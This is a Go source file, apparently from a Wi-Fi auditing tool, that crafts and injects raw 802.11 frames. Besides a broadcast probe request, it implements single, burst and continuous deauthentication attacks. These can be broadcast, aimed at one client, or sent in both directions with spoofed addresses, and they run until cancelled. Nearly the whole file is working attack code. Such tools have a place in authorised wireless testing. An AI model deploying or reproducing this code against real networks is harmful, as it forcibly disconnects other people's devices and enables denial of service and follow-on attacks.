package sniffer

import (
	"context"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/lcalzada-xor/wmap/internal/core/domain"
)

// Injector handles active packet injection.
type Injector struct {
	Handle *pcap.Handle
	mu     sync.Mutex
}

// NewInjector creates a new Injector.
func NewInjector(iface string) (*Injector, error) {
	// Open handle for injection (unpromiscuous might be enough if monitor mode is on, but we reuse the pattern)
	// Actually, we can reuse the sniffer's handle if we expose it, but separate handle is safer/simpler for now.
	handle, err := pcap.OpenLive(iface, 65536, true, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	return &Injector{Handle: handle}, nil
}

// BroadcastProbe sends a Probe Request to the broadcast address.
func (i *Injector) BroadcastProbe(ssid string) error {
	i.mu.Lock()
	defer i.mu.Unlock()

	// Construct Probe Request
	// 1. RadioTap (dummy)
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate,
		Rate:    5, // 2.5 Mbps? Not critical for injection usually, drivers override
	}

	// 2. Dot11 Header
	// Probes are Mgmt frames (Type 0, Subtype 4)
	srcMAC, _ := net.ParseMAC("02:00:00:00:01:00") // Randomized Source
	dstMAC, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff") // Broadcast
	bssid, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")  // Broadcast BSSID

	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtProbeReq,
		Address1:       dstMAC,
		Address2:       srcMAC,
		Address3:       bssid,
		SequenceNumber: 0, // OS/Driver might handle this
	}

	// 3. Mgmt Layer (empty for ProbeReq structure in gopacket, payload goes into IEs)
	// We need to build the payload manually or use Dot11MgmtProbeReq layer?
	// gopacket layers.Dot11MgmtProbeReq is just empty struct usually.
	// We need to append Information Elements.

	// Payload: SSID Tag + Rates Tag
	payload := []byte{}

	// SSID Tag (ID 0)
	payload = append(payload, 0, byte(len(ssid)))
	payload = append(payload, []byte(ssid)...)

	// Supported Rates (ID 1)
	// 1, 2, 5.5, 11 Mbps
	rates := []byte{0x82, 0x84, 0x8b, 0x96}
	payload = append(payload, 1, byte(len(rates)))
	payload = append(payload, rates...)

	// Buffer to write
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts,
		radiotap,
		dot11,
		gopacket.Payload(payload),
	); err != nil {
		return err
	}

	if err := i.Handle.WritePacketData(buf.Bytes()); err != nil {
		log.Printf("Failed to inject probe: %v", err)
		return err
	}

	return nil
}

// SendDeauthPacket sends a single deauthentication frame
func (i *Injector) SendDeauthPacket(targetMAC, senderMAC net.HardwareAddr, reasonCode uint16) error {
	i.mu.Lock()
	defer i.mu.Unlock()

	// Construct RadioTap header
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate,
		Rate:    5,
	}

	// Construct Dot11 header for deauth frame
	// Deauth frames: Type 0 (Management), Subtype 12 (0xC)
	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtDeauthentication,
		Address1:       targetMAC, // Destination (receiver)
		Address2:       senderMAC, // Source (sender)
		Address3:       senderMAC, // BSSID (same as sender for deauth)
		SequenceNumber: 0,
	}

	// Deauth management frame with reason code
	deauth := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11Reason(reasonCode),
	}

	// Serialize the packet
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, radiotap, dot11, deauth); err != nil {
		return fmt.Errorf("failed to serialize deauth packet: %w", err)
	}

	// Inject the packet
	if err := i.Handle.WritePacketData(buf.Bytes()); err != nil {
		return fmt.Errorf("failed to inject deauth packet: %w", err)
	}

	return nil
}

// SendDeauthBurst sends multiple deauth packets according to the config
func (i *Injector) SendDeauthBurst(config domain.DeauthAttackConfig) error {
	targetMAC, err := net.ParseMAC(config.TargetMAC)
	if err != nil {
		return fmt.Errorf("invalid target MAC: %w", err)
	}

	var clientMAC net.HardwareAddr
	if config.ClientMAC != "" {
		clientMAC, err = net.ParseMAC(config.ClientMAC)
		if err != nil {
			return fmt.Errorf("invalid client MAC: %w", err)
		}
	}

	count := config.PacketCount
	if count <= 0 {
		count = 10 // Default burst size
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 100 * time.Millisecond
	}

	for j := 0; j < count; j++ {
		switch config.AttackType {
		case domain.DeauthBroadcast:
			// Send deauth from AP to broadcast
			broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")
			if err := i.SendDeauthPacket(broadcast, targetMAC, config.ReasonCode); err != nil {
				log.Printf("Failed to send broadcast deauth: %v", err)
			}

		case domain.DeauthUnicast:
			// Send deauth from AP to specific client
			if clientMAC != nil {
				if err := i.SendDeauthPacket(clientMAC, targetMAC, config.ReasonCode); err != nil {
					log.Printf("Failed to send unicast deauth: %v", err)
				}
			}

		case domain.DeauthTargeted:
			// Send bidirectional deauth (AP->Client and Client->AP)
			if clientMAC != nil {
				// AP -> Client
				if err := i.SendDeauthPacket(clientMAC, targetMAC, config.ReasonCode); err != nil {
					log.Printf("Failed to send AP->Client deauth: %v", err)
				}
				// Client -> AP
				if err := i.SendDeauthPacket(targetMAC, clientMAC, config.ReasonCode); err != nil {
					log.Printf("Failed to send Client->AP deauth: %v", err)
				}
			}
		}

		if j < count-1 {
			time.Sleep(interval)
		}
	}

	return nil
}

// StartContinuousDeauth starts a continuous deauth attack until context is cancelled
func (i *Injector) StartContinuousDeauth(ctx context.Context, config domain.DeauthAttackConfig, statusChan chan<- domain.DeauthAttackStatus) error {
	targetMAC, err := net.ParseMAC(config.TargetMAC)
	if err != nil {
		return fmt.Errorf("invalid target MAC: %w", err)
	}

	var clientMAC net.HardwareAddr
	if config.ClientMAC != "" {
		clientMAC, err = net.ParseMAC(config.ClientMAC)
		if err != nil {
			return fmt.Errorf("invalid client MAC: %w", err)
		}
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 100 * time.Millisecond
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	packetsSent := 0
	broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			switch config.AttackType {
			case domain.DeauthBroadcast:
				if err := i.SendDeauthPacket(broadcast, targetMAC, config.ReasonCode); err != nil {
					log.Printf("Failed to send broadcast deauth: %v", err)
				} else {
					packetsSent++
				}

			case domain.DeauthUnicast:
				if clientMAC != nil {
					if err := i.SendDeauthPacket(clientMAC, targetMAC, config.ReasonCode); err != nil {
						log.Printf("Failed to send unicast deauth: %v", err)
					} else {
						packetsSent++
					}
				}

			case domain.DeauthTargeted:
				if clientMAC != nil {
					// AP -> Client
					if err := i.SendDeauthPacket(clientMAC, targetMAC, config.ReasonCode); err != nil {
						log.Printf("Failed to send AP->Client deauth: %v", err)
					} else {
						packetsSent++
					}
					// Client -> AP
					if err := i.SendDeauthPacket(targetMAC, clientMAC, config.ReasonCode); err != nil {
						log.Printf("Failed to send Client->AP deauth: %v", err)
					} else {
						packetsSent++
					}
				}
			}

			// Send status update every 10 packets
			if packetsSent%10 == 0 && statusChan != nil {
				select {
				case statusChan <- domain.DeauthAttackStatus{
					PacketsSent: packetsSent,
					Status:      domain.AttackRunning,
				}:
				default:
				}
			}
		}
	}
}

func (i *Injector) Close() {
	if i.Handle != nil {
		i.Handle.Close()
	}
}
